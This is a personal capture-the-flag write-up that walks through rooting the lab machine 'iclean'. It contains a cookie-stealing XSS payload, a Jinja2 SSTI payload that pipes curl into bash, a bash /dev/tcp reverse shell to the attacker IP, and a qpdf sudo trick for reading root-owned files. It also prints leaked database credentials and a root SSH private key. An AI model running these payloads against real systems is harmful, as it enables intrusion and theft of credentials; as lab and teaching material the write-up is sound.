# NMAP TCP

ME: 10.10.14.217
TARGET: 10.129.25.142

```
└─$ sudo nmap -sC -sV -p- -Pn 10.129.25.142 --max-retries 1                        
[sudo] password for xmen: 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-15 00:08 -0400
Warning: 10.129.25.142 giving up on port because retransmission cap hit (1).
Stats: 0:00:47 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 00:09 (0:00:06 remaining)
Nmap scan report for 10.129.25.142
Host is up (0.046s latency).
Not shown: 65236 closed tcp ports (reset), 297 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 2c:f9:07:77:e3:f1:3a:36:db:f2:3b:94:e3:b7:cf:b2 (ECDSA)
|_  256 4a:91:9f:f2:74:c0:41:81:52:4d:f1:ff:2d:01:78:6b (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.46 seconds
```

# Port 80

Found a website capiclean.htb (needed to add to hosts file due to redirects using the host)

Found a login form

Found a teams page with Names:

```
Mary Pikes
Martha Smith
Jasmine Summers
Mike Samuels
```

User list and hydra didn't lead anywhere

Used burp against the /quote endpoint and a python http.server to catch XSS via the service field in that form

This allowed for the cookie which is a python flask session cookie - 

```
POST /sendMessage HTTP/1.1
Host: capiclean.htb
Content-Length: 147
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://capiclean.htb
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://capiclean.htb/quote
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

service=<img+src%3dx+onerror%3dfetch("http%3a//10.10.14.217/%3f"%2bdocument.cookie)+/>&service=Tile+%26+Grout&service=Office+Cleaning&email=a@b.com
```

Response recorded:
```
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.25.142 - - [15/Apr/2026 01:05:28] code 404, message File not found
10.129.25.142 - - [15/Apr/2026 01:05:28] "GET /service?%27+document.cookie; HTTP/1.1" 404 -
10.129.25.142 - - [15/Apr/2026 01:06:47] code 404, message File not found
10.129.25.142 - - [15/Apr/2026 01:06:47] "GET /coooki?%27+document.cookie; HTTP/1.1" 404 -
10.129.25.142 - - [15/Apr/2026 01:12:08] "GET /?session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.ad6s3Q.Ch-7ek99cpuoLM2OTQItdNL6D24 HTTP/1.1" 200 -
```

Able to decode using https://ari.lt/tools/flaskcookie

Which gives

```
Payload: {"role":"21232f297a57a5a743894a0e4a801fc3"}
```

This is the md5 hash for admin

Also, dirbuster found a path we can't access normally:

```
┌──(xmen㉿kali)-[~]
└─$ dirb http://capiclean.htb /usr/share/wordlists/dirb/big.txt

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Apr 15 00:15:53 2026
URL_BASE: http://capiclean.htb/
WORDLIST_FILES: /usr/share/wordlists/dirb/big.txt

-----------------

GENERATED WORDS: 20458                                                         

---- Scanning URL: http://capiclean.htb/ ----
+ http://capiclean.htb/about (CODE:200|SIZE:5267)                                                                                                                                                                                          
+ http://capiclean.htb/choose (CODE:200|SIZE:6084)                                                                                                                                                                                         
+ http://capiclean.htb/dashboard (CODE:302|SIZE:189)                                                                                                                                                                                       
+ http://capiclean.htb/login (CODE:200|SIZE:2106)                                                                                                                                                                                          
+ http://capiclean.htb/logout (CODE:302|SIZE:189)                                                                                                                                                                                          
+ http://capiclean.htb/quote (CODE:200|SIZE:2237)                                                                                                                                                                                          
+ http://capiclean.htb/server-status (CODE:403|SIZE:278)                                                                                                                                                                                   
+ http://capiclean.htb/services (CODE:200|SIZE:8592)                                                                                                                                                                                       
+ http://capiclean.htb/team (CODE:200|SIZE:8109)           
```

Going to dashboard with this cookie set lets me in though

Gives options for Generating Invoice, Generating QR, Quote Requests viewing and Editing Services

From futzing with it, the QR code URL field for generating QR is vulnerable to SSTI as its treated as a flask/jinja template

This is discoverable by sending {{ config.items() }} from [[flask-jinja2-pentesting | SSTI]] via burp repeater and getting back data

Able to then send

```
invoice_id=&form_type=scannable_invoice&qr_link={{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("curl 10.10.14.217:80/revshell | bash")|attr("read")()}}
```

To fetch and pipe into bash a revshell stored on my machine, served up by python simple http server

```
└─$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.25.142 - - [15/Apr/2026 01:39:33] code 404, message File not found
10.129.25.142 - - [15/Apr/2026 01:39:33] "GET /revshell HTTP/1.1" 404 -
^C
Keyboard interrupt received, exiting.
                                                                                                                                                                                                                                            
┌──(xmen㉿kali)-[~]
└─$ vi revshell
                                                                                                                                                                                                                                            
┌──(xmen㉿kali)-[~]
└─$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.25.142 - - [15/Apr/2026 01:40:49] "GET /revshell HTTP/1.1" 200 -
```

RevShell:
```
bash -i >& /dev/tcp/10.10.14.217/9001 0>&1
```

Getting a shell as www-data:
```
└─$ nc -lvnp 9001                                                                                          
listening on [any] 9001 ...
connect to [10.10.14.217] from (UNKNOWN) [10.129.25.142] 53316
bash: cannot set terminal process group (1218): Inappropriate ioctl for device
bash: no job control in this shell
www-data@iclean:/opt/app$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@iclean:/opt/app$ whoami
whoami
www-data
www-data@iclean:/opt/app$ 

```

Found that the app.py has creds in it:

```
# Database Configuration
db_config = {
    'host': '127.0.0.1',
    'user': 'iclean',
    'password': 'pxCsmnGLckUb',
    'database': 'capiclean'
}
```

Using this to check out the users table in capiclean DB via the mysql command gives a SHA256 hash for consuela user's password

```
simple and clean
```

su and this password to get shell as consuela

# Shell as Consuela

Found user.txt

sudo -l shows I can run the qpdf binary which is a GTFOBin

This allows only file reads as root

Able to get flag and able to get id_rsa for root using this:

```
consuela@iclean:/opt/app$ sudo /usr/bin/qpdf --empty --add-attachment /root/root.txt --key=x -- /tmp/flag.txt
sudo /usr/bin/qpdf --empty --add-attachment /root/root.txt --key=x -- /tmp/flag.txt
consuela@iclean:/opt/app$ sudo /usr/bin/qpdf --show-attachment=x /tmp/flag.txt
sudo /usr/bin/qpdf --show-attachment=x /tmp/flag.txt
4f0ec7ce5aca04881430cf412c1aaa7b
```

```
consuela@iclean:/opt/app$ sudo /usr/bin/qpdf --empty --add-attachment /root/.ssh/id_rsa --key=y -- /tmp/id_rsa
sudo /usr/bin/qpdf --empty --add-attachment /root/.ssh/id_rsa --key=y -- /tmp/id_rsa
consuela@iclean:/opt/app$ sudo /usr/bin/qpdf --show-attachment=y /tmp/id_rsa
sudo /usr/bin/qpdf --show-attachment=y /tmp/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAaAAAABNlY2RzYS
1zaGEyLW5pc3RwMjU2AAAACG5pc3RwMjU2AAAAQQQMb6Wn/o1SBLJUpiVfUaxWHAE64hBN
vX1ZjgJ9wc9nfjEqFS+jAtTyEljTqB+DjJLtRfP4N40SdoZ9yvekRQDRAAAAqGOKt0ljir
dJAAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAxvpaf+jVIEslSm
JV9RrFYcATriEE29fVmOAn3Bz2d+MSoVL6MC1PISWNOoH4OMku1F8/g3jRJ2hn3K96RFAN
EAAAAgK2QvEb+leR18iSesuyvCZCW1mI+YDL7sqwb+XMiIE/4AAAALcm9vdEBpY2xlYW4B
AgMEBQ==
-----END OPENSSH PRIVATE KEY-----
```

Then able to ssh as root:

```
┌──(xmen㉿kali)-[~]
└─$ chmod 600 id_rsa 
                                                                                                                                                                                                                                            
┌──(xmen㉿kali)-[~]
└─$ ssh -i id_rsa root@10.129.25.142 
The authenticity of host '10.129.25.142 (10.129.25.142)' can't be established.
ED25519 key fingerprint is: SHA256:3nZua2j9n72tMAHW1xkEyDq3bjYNNSBIszK1nbQMZfs
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.25.142' (ED25519) to the list of known hosts.
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

  System information as of Tue Apr 14 11:43:46 PM UTC 2026




Expanded Security Maintenance for Applications is not enabled.

3 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

root@iclean:~# id
uid=0(root) gid=0(root) groups=0(root)
root@iclean:~# whoami
root
```

==DONE==